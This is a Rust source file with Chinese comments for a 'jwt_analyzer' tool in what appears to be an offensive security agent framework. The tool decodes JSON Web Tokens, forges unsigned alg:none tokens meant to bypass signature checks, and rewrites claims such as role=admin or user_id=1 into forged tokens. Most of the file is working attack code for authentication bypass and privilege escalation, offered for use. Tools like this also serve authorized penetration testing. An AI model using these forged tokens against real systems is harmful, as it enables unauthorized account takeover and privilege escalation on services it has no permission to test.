//! jwt_analyzer 工具：JSON Web Token 原生分析、篡改与常见安全漏洞检查。
//!
//! 支持功能：
//! 1. decode: 解析 Header 与 Payload，展示敏感字段与过期时间（exp/iat/nbf）
//! 2. none_alg: 自动将算法置为 "none" 或 "None" 构造无签名绕过 Token
//! 3. modify_claims: 篡改 Claims（如提升 role=admin, user_id=1 等）并重新打包

use std::future::Future;
use std::pin::Pin;

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use cyber_agent::{AgentError, Result, Tool, ToolCtx, ToolOutput, ToolSchema};
use serde_json::{json, Value};

pub struct JwtAnalyzerTool;

impl Tool for JwtAnalyzerTool {
    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: "jwt_analyzer".into(),
            description: "JSON Web Token 原生分析与安全篡改工具。支持解析 Header/Payload、生成 alg:none 签名绕过 Token、修改 Claims 字段并重构 Token。".into(),
            tags: vec!["security".into(), "web".into(), "jwt".into(), "auth".into()],
            parameters: json!({
                "type": "object",
                "properties": {
                    "token": {
                        "type": "string",
                        "description": "原始 JWT 字符串 (形如 eyJhbG...)"
                    },
                    "action": {
                        "type": "string",
                        "enum": ["decode", "none_alg", "modify_claims"],
                        "description": "操作类型：decode (解析), none_alg (构造 none 算法绕过), modify_claims (修改 Claims)"
                    },
                    "new_claims": {
                        "type": "object",
                        "description": "modify_claims 操作下需新增或覆盖的键值对",
                        "additionalProperties": true
                    }
                },
                "required": ["token", "action"]
            }),
        }
    }

    fn run<'a>(
        &'a self,
        input: Value,
        _ctx: &'a ToolCtx,
    ) -> Pin<Box<dyn Future<Output = Result<ToolOutput>> + Send + 'a>> {
        Box::pin(async move {
            let token_raw = input
                .get("token")
                .and_then(|v| v.as_str())
                .ok_or_else(|| AgentError::Provider("jwt_analyzer 缺少 token 参数".into()))?;

            let action = input
                .get("action")
                .and_then(|v| v.as_str())
                .ok_or_else(|| AgentError::Provider("jwt_analyzer 缺少 action 参数".into()))?;

            let parts: Vec<&str> = token_raw.trim().split('.').collect();
            if parts.len() < 2 {
                return Ok(ToolOutput {
                    content: "无效的 JWT 格式（必须至少包含 Header 和 Payload 两个点号分隔部分）"
                        .into(),
                    is_error: true,
                });
            }

            let header_str = decode_b64_url(parts[0])?;
            let payload_str = decode_b64_url(parts[1])?;

            let header_json: Value = serde_json::from_str(&header_str)
                .map_err(|e| AgentError::Provider(format!("Header JSON 解析失败: {e}")))?;
            let mut payload_json: Value = serde_json::from_str(&payload_str)
                .map_err(|e| AgentError::Provider(format!("Payload JSON 解析失败: {e}")))?;

            match action {
                "decode" => {
                    let res = json!({
                        "header": header_json,
                        "payload": payload_json,
                        "signature_length": parts.get(2).map(|s| s.len()).unwrap_or(0),
                        "has_signature": parts.len() >= 3 && !parts[2].is_empty()
                    });
                    Ok(ToolOutput {
                        content: serde_json::to_string_pretty(&res).unwrap_or_default(),
                        is_error: false,
                    })
                }
                "none_alg" => {
                    let mut forged_header = header_json.clone();
                    if let Some(obj) = forged_header.as_object_mut() {
                        obj.insert("alg".to_string(), json!("none"));
                    }
                    let forged_h_b64 =
                        encode_b64_url(&serde_json::to_string(&forged_header).unwrap());
                    let p_b64 = encode_b64_url(&serde_json::to_string(&payload_json).unwrap());

                    let forged_token_dot = format!("{forged_h_b64}.{p_b64}.");
                    let forged_token_no_dot = format!("{forged_h_b64}.{p_b64}");

                    let res = json!({
                        "description": "构造的 alg: none 漏洞 Token（分别尝试带尾随点与不带尾随点）",
                        "token_with_trailing_dot": forged_token_dot,
                        "token_without_trailing_dot": forged_token_no_dot,
                        "forged_header": forged_header,
                        "payload": payload_json,
                    });
                    Ok(ToolOutput {
                        content: serde_json::to_string_pretty(&res).unwrap_or_default(),
                        is_error: false,
                    })
                }
                "modify_claims" => {
                    if let Some(new_claims) = input.get("new_claims").and_then(|v| v.as_object()) {
                        if let Some(payload_obj) = payload_json.as_object_mut() {
                            for (k, v) in new_claims {
                                payload_obj.insert(k.clone(), v.clone());
                            }
                        }
                    }

                    // 构造未签名（或保留原签名占位）的 token
                    let mut forged_header = header_json.clone();
                    if let Some(obj) = forged_header.as_object_mut() {
                        obj.insert("alg".to_string(), json!("none"));
                    }
                    let forged_h_b64 =
                        encode_b64_url(&serde_json::to_string(&forged_header).unwrap());
                    let p_b64 = encode_b64_url(&serde_json::to_string(&payload_json).unwrap());
                    let forged_token = format!("{forged_h_b64}.{p_b64}.");

                    let res = json!({
                        "description": "修改 Claims 后的未签名 Token",
                        "forged_token": forged_token,
                        "modified_payload": payload_json
                    });
                    Ok(ToolOutput {
                        content: serde_json::to_string_pretty(&res).unwrap_or_default(),
                        is_error: false,
                    })
                }
                other => Ok(ToolOutput {
                    content: format!("不支持的操作: {other}"),
                    is_error: true,
                }),
            }
        })
    }
}

fn decode_b64_url(s: &str) -> std::result::Result<String, AgentError> {
    let cleaned: String = s.chars().filter(|c| !c.is_whitespace()).collect();
    let bytes = URL_SAFE_NO_PAD
        .decode(cleaned.as_bytes())
        .or_else(|_| base64::engine::general_purpose::STANDARD.decode(cleaned.as_bytes()))
        .map_err(|e| AgentError::Provider(format!("Base64URL 解码错误: {e}")))?;
    String::from_utf8(bytes).map_err(|e| AgentError::Provider(format!("UTF-8 转换失败: {e}")))
}

fn encode_b64_url(s: &str) -> String {
    URL_SAFE_NO_PAD.encode(s.as_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jwt_decode() {
        let _token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let h = decode_b64_url("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9").unwrap();
        assert!(h.contains("HS256"));
    }
}
